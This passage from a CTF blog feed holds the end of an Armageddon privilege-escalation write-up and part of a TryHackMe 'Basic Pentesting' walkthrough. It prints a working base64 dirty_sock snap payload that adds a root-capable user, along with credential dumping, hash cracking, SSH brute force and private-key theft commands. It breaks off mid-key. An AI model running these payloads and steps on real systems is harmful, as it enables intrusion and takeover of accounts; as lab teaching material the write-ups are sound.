</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">`</span><span class="n">uid</span><span class="o">`</span><span class="w"> </span><span class="kt">int</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="k">unsigned</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="no">NULL</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="w"> </span><span class="n">COMMENT</span><span class="w"> </span><span class="s1">&#39;Primary Key: Unique user ID.&#39;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">`</span><span class="n">name</span><span class="o">`</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="no">NULL</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="n">COMMENT</span><span class="w"> </span><span class="s1">&#39;Unique user name.&#39;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">`</span><span class="n">pass</span><span class="o">`</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="no">NULL</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="n">COMMENT</span><span class="w"> </span><span class="s1">&#39;User’s password (hashed).&#39;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span><span class="w">
</span></span></span></code></pre></div><p>Knowing the <code>users</code> table structure, I could use the MySQL <code>-e</code> option to retrieve the contents of column <code>name</code> and column <code>pass</code>  from the <code>users</code> table. This returns a password hash of <code>brucetherealadmin</code>, and I will have to crack this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.2$ mysql -h localhost -u drupaluser -p<span class="s1">&#39;CQHEy@9M*m23gBVj&#39;</span> drupal -e <span class="s1">&#39;select name, pass from users&#39;</span>
</span></span><span class="line"><span class="cl">name    pass
</span></span><span class="line"><span class="cl">brucetherealadmin       <span class="nv">$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97</span>.oOsUf1xAhaadURt
</span></span></code></pre></div><h4 id="password-crack">Password Crack</h4>
<p>The password has been recovered back to plain text using <code>hashcat</code> and <code>rockyou.txt</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\t</span>ools<span class="se">\h</span>ashcat6&gt; hashcat.exe -m <span class="m">7900</span> <span class="s2">&#34;</span><span class="nv">$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97</span><span class="s2">.oOsUf1xAhaadURt&#34;</span> rockyou.txt
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="nv">$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97</span>.oOsUf1xAhaadURt:booboo
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Name........: Drupal7
</span></span><span class="line"><span class="cl">Hash.Target......: <span class="nv">$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97</span>.oOsUf1xAhaadURt
</span></span><span class="line"><span class="cl">Time.Started.....: Tue Mar <span class="m">30</span> 12:03:57 <span class="m">2021</span> <span class="o">(</span><span class="m">3</span> secs<span class="o">)</span>
</span></span><span class="line"><span class="cl">Time.Estimated...: Tue Mar <span class="m">30</span> 12:04:00 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h4 id="ssh---brucetherealadmin">SSH - brucetherealadmin</h4>
<p>The password <code>booboo</code> works for <code>brucetherealadmin</code> and can be used on SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.4» 
</span></span><span class="line"><span class="cl">$ ssh brucetherealadmin@10.129.90.96
</span></span><span class="line"><span class="cl">brucetherealadmin@10.10.10.233<span class="err">&#39;</span>s password:
</span></span><span class="line"><span class="cl">Last login: Tue Mar <span class="m">23</span> 12:40:36 <span class="m">2021</span> from 10.10.14.2
</span></span><span class="line"><span class="cl"><span class="o">[</span>brucetherealadmin@armageddon ~<span class="o">]</span>$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>brucetherealadmin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>brucetherealadmin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>brucetherealadmin<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span></span></code></pre></div><p>User flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>User <code>brucetherealadmin</code> is allowed to run  <code>/usr/bin/snap install</code> as root user. I could leverage this rights to install a malicious snap package.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>brucetherealadmin@armageddon ~<span class="o">]</span>$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> brucetherealadmin on armageddon:
</span></span><span class="line"><span class="cl">    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;MAIL
</span></span></span><span class="line"><span class="cl"><span class="s2">    PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_MONETARY LC_NAME LC_NUMERIC
</span></span></span><span class="line"><span class="cl"><span class="s2">    LC_PAPER LC_TELEPHONE&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;</span>, <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User brucetherealadmin may run the following commands on armageddon:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/snap install *
</span></span></code></pre></div><h4 id="malicious-snap-package">Malicious Snap Package</h4>
<p>After googling around, I found <a href="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html">this blog</a> by <a href="https://twitter.com/init_string">Chris Moberly</a> about Dirty Sock vulnerability in Snap version &lt; 2.37. The author created two PoC exploits for this vulnerability:</p>
<ul>
<li>
<p><a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv1.py">dirty_sockv1</a>: Uses the ‘create-user’ API to create a local user based on details queried from the Ubuntu SSO.</p>
</li>
<li>
<p><a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py">dirty_sockv2</a>: Sideloads a snap that contains an install-hook that generates a new local user.</p>
</li>
</ul>
<p>The current snap version is not vulnerable (<a href="https://github.com/snapcore/snapd/commit/ce458d69bf0f336a34fb552be89c68071c683049#diff-2c0c2e43fe96e84eb5935d499907cd6c263fb806c165b723d638118344962484">patched with regex</a>) to Dirty Sock. But, since the goal here is to install a malicious snap package with administrative privilege, I can steal the payload (trojan snap code) from the PoC exploit v2 and revert it back to a snap package.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ snap version
</span></span><span class="line"><span class="cl">snap    2.47.1-1.el7
</span></span><span class="line"><span class="cl">snapd   2.47.1-1.el7
</span></span><span class="line"><span class="cl">series  <span class="m">16</span>
</span></span><span class="line"><span class="cl">centos  <span class="m">7</span>
</span></span><span class="line"><span class="cl">kernel  3.10.0-1160.6.1.el7.x86_64
</span></span></code></pre></div><p>First, I will grab the v2 exploit and transfer it to Armageddon</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploit» «10.10.14.4» 
</span></span><span class="line"><span class="cl">$ wget https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py
</span></span><span class="line"><span class="cl">→ kali@kali «exploit» «10.10.14.4» 
</span></span><span class="line"><span class="cl">$ scp dirty_sockv2.py brucetherealadmin@10.129.92.110:/dev/shm
</span></span><span class="line"><span class="cl">brucetherealadmin@10.129.92.110<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">dirty_sockv2.py                                       100% <span class="m">8696</span>     8.5KB/s   00:01    
</span></span></code></pre></div><p>I will pull out the payload from the exploit and revert it back to a snap package.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ python3 -c <span class="s2">&#34;print(&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; /////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&#39;&#39;&#39;+ &#39;A&#39; * 4256 + &#39;==&#39;)&#34;</span> <span class="p">|</span> base64 -d &gt; malicious.snap
</span></span><span class="line"><span class="cl"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ file malicious.snap
</span></span><span class="line"><span class="cl">file malicious.snap
</span></span><span class="line"><span class="cl">malicious.snap: Squashfs filesystem, little endian, version 4.0, <span class="m">910</span> bytes, <span class="m">7</span> inodes, blocksize: <span class="m">131072</span> bytes, created: Sat Feb  <span class="m">2</span> 23:00:32 <span class="m">2019</span>
</span></span></code></pre></div><h4 id="install-malicious-package">Install Malicious Package</h4>
<p>The <code>malicious.snap</code> file now can be installed with  <code>--devmode</code> option to skip digital signatures check. If the exploit success, there will be a new user added called <code>dirty_sock</code>  (default from the payload).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ sudo /usr/bin/snap install --devmode malicious.snap 
</span></span><span class="line"><span class="cl">dirty-sock 0.1 installed
</span></span></code></pre></div><p>When I look at the <code>/etc/passwdm</code>, the user is there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ cat /etc/passwd <span class="p">|</span> grep sh$
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
</span></span><span class="line"><span class="cl">dirty_sock:x:1001:1001::/home/dirty_sock:/bin/bash
</span></span></code></pre></div><h4 id="su---root">su - root</h4>
<p>Now I can switch user to <code>dirty_sock</code> using a password of <code>dirty_sock</code> and run <code>sudo su</code> to obtain a root shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ su dirty_sock
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl"><span class="o">[</span>dirty_sock@armageddon shm<span class="o">]</span>$ sudo su
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">We trust you have received the usual lecture from the <span class="nb">local</span> System
</span></span><span class="line"><span class="cl">Administrator. It usually boils down to these three things:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">#1) Respect the privacy of others.</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#2) Think before you type.</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#3) With great power comes great responsibility.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> dirty_sock: 
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@armageddon shm<span class="o">]</span><span class="c1"># ifconfig</span>
</span></span><span class="line"><span class="cl">ens192: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="m">1500</span>
</span></span><span class="line"><span class="cl">        inet 10.129.92.110  netmask 255.255.0.0  broadcast 10.129.255.255
</span></span><span class="line"><span class="cl">        inet6 fe80::7edc:a185:87bc:5935  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;
</span></span><span class="line"><span class="cl">        inet6 fe80::7648:5ea1:5371:b3b5  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;
</span></span><span class="line"><span class="cl">        inet6 fe80::ef75:a96e:3c27:e78b  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;
</span></span><span class="line"><span class="cl">        ether 00:50:56:b9:41:c7  txqueuelen <span class="m">1000</span>  <span class="o">(</span>Ethernet<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX packets <span class="m">9191</span>  bytes <span class="m">732392</span> <span class="o">(</span>715.2 KiB<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX errors <span class="m">0</span>  dropped <span class="m">0</span>  overruns <span class="m">0</span>  frame <span class="m">0</span>
</span></span><span class="line"><span class="cl">        TX packets <span class="m">1149</span>  bytes <span class="m">188885</span> <span class="o">(</span>184.4 KiB<span class="o">)</span>
</span></span><span class="line"><span class="cl">        TX errors <span class="m">0</span>  dropped <span class="m">0</span> overruns <span class="m">0</span>  carrier <span class="m">0</span>  collisions <span class="m">0</span>
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>TryHackMe - Basic Pentesting</title>
      <link>https://fahmifj.github.io/tryhackme/basic-pentesting/</link>
      <pubDate>Fri, 18 Jun 2021 19:15:35 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/tryhackme/basic-pentesting/</guid>
      <description>This is a machine that allows you to practise web app hacking and privilege escalation </description>
      <content:encoded><![CDATA[<fieldset>
<legend>Room Information </legend>
<ul>
<li><strong>Name:</strong> <a href="https://tryhackme.com/room/basicpentestingjt">Basic Pentesting</a></li>
<li><strong>Category:</strong> Boot2root</li>
<li><strong>Type</strong>: Challenge/CTF</li>
<li><strong>Difficulty:</strong> Easy</li>
<li><strong>Tools</strong>:
<ul>
<li>Nmap</li>
<li>Gobuster</li>
<li>John the Ripper</li>
<li>smbclient</li>
</ul>
</li>
<li><strong>Skills Learned</strong>
<ul>
<li>Basics of enumeration</li>
<li>Brute-force attack</li>
</ul>
</li>
</ul>
</fieldset>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> full scan discovers six open ports: SSH (22), HTTP (80), SMB (139 &amp; 445), Apache JServ Protocol (8009), and Apache Tomcat (8080).</p>
<p><div class="img-container"><img src="imgs/image-20210530002323622.png" alt="image-20210530002323622"  /></div>
</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Anonymous login is allowed on SMB.</p>
<p><div class="img-container"><img src="imgs/image-20210530004538478-1624087102246.png" alt="image-20210530004538478"  /></div>
</p>
<p>Accessing <code>anonymous</code> share with anonymous logon finds a text file called <code>staff.txt</code>. I&rsquo;ll grab that file to my machine</p>
<p><div class="img-container"><img src="imgs/image-20210530004922142.png" alt="image-20210530004922142"  /></div>
</p>
<p>The contents of <code>staff.txt</code> reveals two potential usernames: <code>jan</code> and <code>kay</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210530004937052.png" alt="image-20210530004937052"  /></div>
</p>
<h3 id="tcp-80---web">TCP 80 - Web</h3>
<p>Poking the web with <code>curl</code> finds out that it is under maintenance.</p>
<p><div class="img-container"><img src="imgs/image-20210530004040209.png" alt="image-20210530004040209"  /></div>
</p>
<h4 id="gobuster">Gobuster</h4>
<p><code>Gobuster</code> scan discovers one hidden directory called <code>development</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «basic-pentesting» «10.9.30.115»
</span></span><span class="line"><span class="cl">$ gobuster dir -u http://10.10.67.164/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt gobuster/gobuster-S-80 --no-error -z
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.67.164/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/05/29 13:43:47 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/development          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 318<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.67.164/development/<span class="o">]</span>
</span></span></code></pre></div><h4 id="development">/development</h4>
<p>The web has a directory listing enabled on <code>/development</code>, and there are two text files in that directory:  <code>dev.txt</code> and <code>j.txt</code></p>
<p><div class="img-container"><img src="imgs/image-20210530010100831.png" alt="image-20210530010100831"  /></div>
</p>
<p><code>j.txt</code>  contains a note from K to J.</p>
<p><div class="img-container"><img src="imgs/image-20210530010150205.png" alt="image-20210530010150205"  /></div>
</p>
<p>From the previous SMB enumeration, K and J here are probably Kay and Jan. If so, I could try a brute-force attack on user Jay, since Kay is pointing out that Jan has a weak password.</p>
<p><code>dev.txt</code> contains about project development logs.</p>
<p><div class="img-container"><img src="imgs/image-20210530010131055.png" alt="image-20210530010131055"  /></div>
</p>
<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
<p>There are some potential exploits for Apache Structs 2.5.12, which I could try later.</p>
<p><div class="img-container"><img src="imgs/image-20210619142047338.png" alt="image-20210619142047338"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<p>For foothold, I have two options: brute forcing SSH and exploiting Apache Struts.</p>
<p>Brute force might take some time, so I&rsquo;ll leave it on the background and start with Apache Struts.</p>
<h3 id="shell-as-tomcat">Shell as tomcat</h3>
<h4 id="apache-struts-rce-cve-2017-9805">Apache Struts RCE CVE-2017-9805</h4>
<p>Metasploit also has an <a href="https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream/">exploit module</a> for this, so I&rsquo;ll  fire up  <code>metasploit</code>. But, first, I need to find out the URI of the Apache Struts.</p>
<p>Looking back to the <code>dev.txt</code> file, it seems Kay uses this <a href="https://mvnrepository.com/artifact/org.apache.struts/struts2-showcase/2.5.12">example showcase</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210619131650429.png" alt="image-20210619131650429"  /></div>
</p>
<p>I also came across this <a href="https://samsclass.info/124/proj14/p10xstruts.htm">blog post</a> and found this:</p>
<p><div class="img-container"><img src="imgs/image-20210619132136356.png" alt="image-20210619132136356"  /></div>
</p>
<p>I typed <code>http://10.10.67.164/struts2-rest-showcase-2.5.12/</code> in my browser, and it resolved to this page.</p>
<p><div class="img-container"><img src="imgs/image-20210619132449500.png" alt="image-20210619132449500"  /></div>
</p>
<p>I tried it with <code>metasploit</code> and it worked!</p>
<p><div class="img-container"><img src="imgs/image-20210619142842848.png" alt="image-20210619142842848"  /></div>
</p>
<h3 id="shell-as-jan">Shell as jan</h3>
<h4 id="ssh-brute-force">SSH Brute Force</h4>
<p>It turns out <code>Hydra</code> finds Jan&rsquo;s SSH password in less than 2 minutes. The password is <code>armando</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «basic-pentesting» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ hydra -l jan -P /opt/SecLists/Passwords/Common-Credentials/best1050.txt ssh://10.10.245.112 
</span></span><span class="line"><span class="cl">Hydra v9.0 <span class="o">(</span>c<span class="o">)</span> <span class="m">2019</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="o">[</span>22<span class="o">][</span>ssh<span class="o">]</span> host: 10.10.245.112   login: jan   password: armando
</span></span><span class="line"><span class="cl"><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-05-29 14:20:56
</span></span></code></pre></div><p>Now I can login as Jan with SSH client.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «basic-pentesting» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ ssh jan@10.10.245.112 
</span></span><span class="line"><span class="cl">jan@10.10.245.112<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 16.04.4 LTS <span class="o">(</span>GNU/Linux 4.4.0-119-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">Last login: Mon Apr <span class="m">23</span> 15:55:45 <span class="m">2018</span> from 192.168.56.102
</span></span><span class="line"><span class="cl">jan@basic2:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jan<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jan<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>jan<span class="o">)</span>
</span></span></code></pre></div><p>Since <code>jan</code> has SSH login, I&rsquo;ll definitely use this for enumeration.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In Kay&rsquo;s home directory there is  a readable SSH key</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jan@basic2:/home/kay/.ssh$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">20</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> kay kay <span class="m">4096</span> Apr <span class="m">23</span>  <span class="m">2018</span> .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">5</span> kay kay <span class="m">4096</span> Apr <span class="m">23</span>  <span class="m">2018</span> ..
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> kay kay  <span class="m">771</span> Apr <span class="m">23</span>  <span class="m">2018</span> authorized_keys
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> kay kay <span class="m">3326</span> Apr <span class="m">19</span>  <span class="m">2018</span> id_rsa
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> kay kay  <span class="m">771</span> Apr <span class="m">19</span>  <span class="m">2018</span> id_rsa.pub
</span></span></code></pre></div><p>I tried the key for login locally as user Kay but it wanted passphrase, so I&rsquo;ll just grab the private key for cracking.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jan@basic2:/home/kay/.ssh$ cat id_rsa
</span></span><span class="line"><span class="cl">-----BEGIN RSA PRIVATE KEY-----                                                      
</span></span><span class="line"><span class="cl">Proc-Type: 4,ENCRYPTED                                                               
</span></span><span class="line"><span class="cl">DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75                               
</span></span><span class="line"><span class="cl">                                                                                     
</span></span><span class="line"><span class="cl">IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ                     
</span></span><span class="line"><span class="cl">o9dyIEJB4wUZTueBPsmb487RdFVkTOVQrVHty1K2aLy2Lka2Cnfjz8Llv+FMadsN                     
</span></span><span class="line"><span class="cl">XRvjw/HRiGcXPY8B7nsA1eiPYrPZHIH3QOFIYlSPMYv79RC65i6frkDSvxXzbdfX                     
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">4eaCAHk1hUL3eseN3ZpQWRnDGAAPxH+LgPyE8Sz1it8aPuP8gZABUFjBbEFMwNYB
</span></span><span class="line"><span class="cl">e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
